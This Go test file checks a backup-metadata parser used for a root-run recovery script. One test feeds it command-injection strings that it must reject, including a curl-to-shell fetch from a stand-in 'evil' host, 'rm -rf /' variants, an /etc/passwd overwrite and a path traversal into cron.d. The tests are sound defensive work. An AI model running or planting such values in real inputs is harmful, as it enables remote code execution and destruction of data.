package api

import (
	"encoding/json"
	"strings"
	"testing"
)

func validMeta() backupPayloadMeta {
	return backupPayloadMeta{
		RecipientSlot:            "A",
		AgentVersion:             "2026-09-15-abc1234",
		AgentKeyFingerprint:      strings.Repeat("a", 16),
		BackupSigningFingerprint: strings.Repeat("b", 64),
		Tenants: []backupMetaTenant{
			{Slug: "acme", Domain: "api.acme.example", HasKeystore: true, SignerSHA256: strings.Repeat("c", 64)},
		},
		InnerFiles: []backupMetaFile{
			{Path: "agent-key", Size: 32, SHA256: strings.Repeat("d", 64),
				Target: "/var/lib/rn-build-agent/agent-key", Mode: "0600", Owner: "builder:builder"},
		},
	}
}

func encodeMeta(t *testing.T, meta backupPayloadMeta) []byte {
	t.Helper()
	raw, err := json.Marshal(meta)
	if err != nil {
		t.Fatal(err)
	}
	return raw
}

func TestBackupMetaAcceptsAWellFormedReport(t *testing.T) {
	parsed, err := parseBackupPayloadMeta(encodeMeta(t, validMeta()))
	if err != nil {
		t.Fatalf("a well-formed report must be accepted: %v", err)
	}
	if parsed.RecipientSlot != "A" || len(parsed.Tenants) != 1 || len(parsed.InnerFiles) != 1 {
		t.Fatalf("round-trip lost something: %+v", parsed)
	}
}

// 这一组是本文件存在的理由。
//
// innerFiles[].path 和 .target 会被渲染进 recover.sh，而那个脚本恢复时以 root 跑。
// 一条带 $(...) 的路径没有任何正当理由出现在备份包里——它只可能是攻击，或者一个
// 严重到必须让人看见的 bug。所以直接拒收，不做转义。
func TestBackupMetaRefusesPathsThatWouldBecomeCommands(t *testing.T) {
	poison := []string{
		"agent-key$(curl http://evil/x|sh)",
		"agent-key`id`",
		"agent-key; rm -rf /",
		"agent-key\nrm -rf /",
		`agent-key" && rm -rf / && echo "`,
		"agent-key'",
		"agent-key|tee /etc/passwd",
		"agent-key&whoami",
		"../../etc/cron.d/backdoor",
		"a/../../b",
		"agent-key\\",
		"agent-key>out",
		"agent-key*",
		"",
		"   ",
	}
	for _, bad := range poison {
		t.Run(strings.ReplaceAll(bad, "\n", "\\n"), func(t *testing.T) {
			meta := validMeta()
			meta.InnerFiles[0].Path = bad
			if _, err := parseBackupPayloadMeta(encodeMeta(t, meta)); err == nil {
				t.Fatalf("path %q was accepted; it would be rendered into recover.sh", bad)
			}
			// target 走同一条渲染路径，同样要挡
			meta = validMeta()
			meta.InnerFiles[0].Target = bad
			if _, err := parseBackupPayloadMeta(encodeMeta(t, meta)); err == nil {
				t.Fatalf("target %q was accepted", bad)
			}
		})
	}
}

// 正常路径不能被误伤：点、斜杠、连字符、下划线都要放行
func TestBackupMetaAcceptsOrdinaryPaths(t *testing.T) {
	for _, good := range []string{
		"agent-key",
		"keystores/acme/keystore.p12",
		"systemd/rn-build-agent.service",
		"bin/build-agent",
		"/etc/rn-build-agent.env",
		"/var/lib/rn-build-agent/agent-key",
		"ssh/id_deploy",
	} {
		meta := validMeta()
		meta.InnerFiles[0].Path = good
		meta.InnerFiles[0].Target = "/opt/" + strings.TrimPrefix(good, "/")
		if _, err := parseBackupPayloadMeta(encodeMeta(t, meta)); err != nil {
			t.Fatalf("ordinary path %q was refused: %v", good, err)
		}
	}
}

func TestBackupMetaFieldValidation(t *testing.T) {
	cases := []struct {
		name string
		edit func(*backupPayloadMeta)
		want string
	}{
		{"unknown slot", func(m *backupPayloadMeta) { m.RecipientSlot = "D" }, "recipientSlot"},
		{"empty slot", func(m *backupPayloadMeta) { m.RecipientSlot = "" }, "recipientSlot"},
		// 两种指纹形式不能混：16 字符是 agent-key，64 字符是备份签名公钥
		{"agent fingerprint wrong length", func(m *backupPayloadMeta) {
			m.AgentKeyFingerprint = strings.Repeat("a", 64)
		}, "16 lowercase hex"},
		{"signing fingerprint wrong length", func(m *backupPayloadMeta) {
			m.BackupSigningFingerprint = strings.Repeat("b", 16)
		}, "64 lowercase hex"},
		{"fingerprint not hex", func(m *backupPayloadMeta) {
			m.AgentKeyFingerprint = strings.Repeat("Z", 16)
		}, "16 lowercase hex"},
		{"no tenants", func(m *backupPayloadMeta) { m.Tenants = nil }, "tenants is empty"},
		{"slug not slug-shaped", func(m *backupPayloadMeta) { m.Tenants[0].Slug = "Acme Corp" }, "slug"},
		{"duplicate slug", func(m *backupPayloadMeta) {
			m.Tenants = append(m.Tenants, m.Tenants[0])
		}, "appears twice"},
		{"no inner files", func(m *backupPayloadMeta) { m.InnerFiles = nil }, "innerFiles is empty"},
		{"mode not octal", func(m *backupPayloadMeta) { m.InnerFiles[0].Mode = "rw-------" }, "mode"},
		{"mode missing leading zero", func(m *backupPayloadMeta) { m.InnerFiles[0].Mode = "600" }, "mode"},
		{"owner not user:group", func(m *backupPayloadMeta) { m.InnerFiles[0].Owner = "root" }, "owner"},
		{"owner with shell metachar", func(m *backupPayloadMeta) { m.InnerFiles[0].Owner = "a$b:c" }, "owner"},
		{"file sha not 64 hex", func(m *backupPayloadMeta) { m.InnerFiles[0].SHA256 = "abc" }, "sha256"},
		{"negative size", func(m *backupPayloadMeta) { m.InnerFiles[0].Size = -1 }, "negative"},
		{"agent version with metachar", func(m *backupPayloadMeta) { m.AgentVersion = "v1;rm -rf /" }, "agentVersion"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			meta := validMeta()
			tc.edit(&meta)
			_, err := parseBackupPayloadMeta(encodeMeta(t, meta))
			if err == nil {
				t.Fatal("expected a refusal")
			}
			if !strings.Contains(err.Error(), tc.want) {
				t.Fatalf("the error should mention %q, got: %v", tc.want, err)
			}
		})
	}
}

// 未知字段要拒掉：打包机和服务端版本不一致时，静默忽略一个字段意味着
// 服务端按一份它读不全的元数据去渲染恢复说明，而那份说明要在灾难当天被照着执行
func TestBackupMetaRefusesUnknownFields(t *testing.T) {
	raw := encodeMeta(t, validMeta())
	var generic map[string]any
	if err := json.Unmarshal(raw, &generic); err != nil {
		t.Fatal(err)
	}
	generic["somethingNew"] = "from a newer agent"
	extended, err := json.Marshal(generic)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := parseBackupPayloadMeta(extended); err == nil {
		t.Fatal("an unknown field was silently ignored")
	}
}

// meta 排在 payload 之前就是为了在收那 512 MiB 之前拒掉坏的元数据；
// 它自己也要有上限，否则「先解析再决定」这句话不成立
func TestBackupMetaHasItsOwnSizeLimit(t *testing.T) {
	meta := validMeta()
	for i := 0; i < backupMaxTenants; i++ {
		meta.Tenants = append(meta.Tenants, backupMetaTenant{
			Slug: strings.Repeat("a", 200) + "-" + strings.Repeat("b", 200), Domain: "x.example",
		})
	}
	if _, err := parseBackupPayloadMeta(encodeMeta(t, meta)); err == nil {
		t.Fatal("an oversized meta was accepted")
	}
}
